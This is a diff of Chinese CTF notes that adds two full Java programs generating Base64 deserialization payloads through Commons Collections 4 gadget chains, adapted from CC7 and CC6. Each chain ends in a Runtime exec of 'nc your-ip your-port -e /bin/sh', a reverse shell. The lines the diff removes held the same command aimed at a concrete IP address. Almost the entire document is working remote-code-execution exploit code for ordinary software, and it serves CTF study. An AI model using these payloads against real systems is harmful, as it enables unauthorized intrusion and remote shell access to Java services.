@@ -46,34 +46,142 @@ CC5链：java<=JDK8u71(1.8.0_71)、commons-collections:<=3.2.1
 
 ^
 CC7链改成适用CommonsCollections=4
+
 ```
+package show.ctf.java;
+
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+import org.apache.commons.collections4.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.*;
+
+public class web851 {
+    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
         Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(Runtime.class),
-                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
-                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
-                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"nc 1.15.153.196 4567 -e /bin/sh"})
+                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",null}),
+                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
+                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"nc your-ip your-port -e /bin/sh"})
+//                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
         };
-        Transformer transformerChain2 = new ChainedTransformer(transformers);
+        // 先传进来一个空的，防止在put里面的equals触发
+        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});
 
-        //使用Hashtable来构造利用链调用LazyMap
-        Map hashMap1 = new HashMap();
-        Map hashMap2 = new HashMap();
-        Class<DefaultedMap> d = DefaultedMap.class;
-        Constructor<DefaultedMap> declaredConstructor = d.getDeclaredConstructor(Map.class, Transformer.class);
-        declaredConstructor.setAccessible(true);
-        DefaultedMap defaultedMap1 = declaredConstructor.newInstance(hashMap1, transformerChain2);
-        DefaultedMap defaultedMap2 = declaredConstructor.newInstance(hashMap2, transformerChain2);
+        HashMap<Object,Object> hashMap1 = new HashMap<>();
+        HashMap<Object,Object> hashMap2 = new HashMap<>();
 
-        defaultedMap1.put("yy", 1);
-        defaultedMap2.put("zZ", 1);
+        // 在java中yy和zZ的hashCode是一样的
+        Map<Object,Object> lazyMap1 = LazyMap.lazyMap(hashMap1,chainedTransformer);
+        lazyMap1.put("yy", 1);
+        Map<Object,Object> lazyMap2 = LazyMap.lazyMap(hashMap2,chainedTransformer);
+        lazyMap2.put("zZ", 1);
+
         Hashtable hashtable = new Hashtable();
-        hashtable.put(defaultedMap1, 1);
-        hashtable.put(defaultedMap2, 1);
-        defaultedMap2.remove("yy");
-        ByteArrayOutputStream baos = new ByteArrayOutputStream();
-        ObjectOutputStream oos = new ObjectOutputStream(baos);
-        oos.writeObject(hashtable);
-        String payload = new String(Base64.getEncoder().encode(baos.toByteArray()));
+        hashtable.put(lazyMap1, 1);
+        hashtable.put(lazyMap2, 2);
+
+        Class c = chainedTransformer.getClass();
+        Field iTransformers = c.getDeclaredField("iTransformers");
+        iTransformers.setAccessible(true);
+        iTransformers.set(chainedTransformer,transformers);
+
+        // LazyMap.get中会多生成一个yy
+        lazyMap2.remove("yy");
+
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+        objectOutputStream.writeObject(hashtable);
+
+        byte[] payloadBytes = byteArrayOutputStream.toByteArray();
+        String payload = Base64.getEncoder().encodeToString(payloadBytes);
+        System.out.println(payload);
+//        serialize(hashtable);
+//        unserialize("ser.bin");
+    }
+
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
+        oos.writeObject(obj);
+    }
+
+    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        Object obj = ois.readObject();
+        return obj;
+    }
+}
+```
+
+CC6链改成适用CommonsCollections=4
+```
+package show.ctf.java;
+
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+import org.apache.commons.collections4.keyvalue.TiedMapEntry;
+import org.apache.commons.collections4.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.*;
+
+public class web851 {
+    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",null}),
+                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
+                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"nc your-ip your-port -e /bin/sh"})
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+
+        HashMap<Object,Object> map = new HashMap<>();
+        // 改成ConstantTransformer是为了防止put的时候就被使用
+        Map<Object,Object> lazyMap = LazyMap.lazyMap(map,new ConstantTransformer(1));
+
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"evo1");
+
+        HashMap<Object,Object> map2 = new HashMap<>();
+        map2.put(tiedMapEntry,"evo2");
+
+        // 序列化的时候需要这个key来过掉LazyMap.get中的map.containsKey(key) == false
+        // 但是序列化后这个key会被放进去，所以需要再去掉
+        lazyMap.remove("evo1");
+
+        Class c = LazyMap.class;
+        Field factory = c.getDeclaredField("factory");
+        factory.setAccessible(true);
+        factory.set(lazyMap,chainedTransformer);
+
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+        objectOutputStream.writeObject(map2);
+
+        byte[] payloadBytes = byteArrayOutputStream.toByteArray();
+        String payload = Base64.getEncoder().encodeToString(payloadBytes);
         System.out.println(payload);
 
+//        serialize(map2);
+//        unserialize("ser.bin");
+    }
+
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
+        oos.writeObject(obj);
+    }
+
+    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        Object obj = ois.readObject();
+        return obj;
+    }
+}
 ```
+
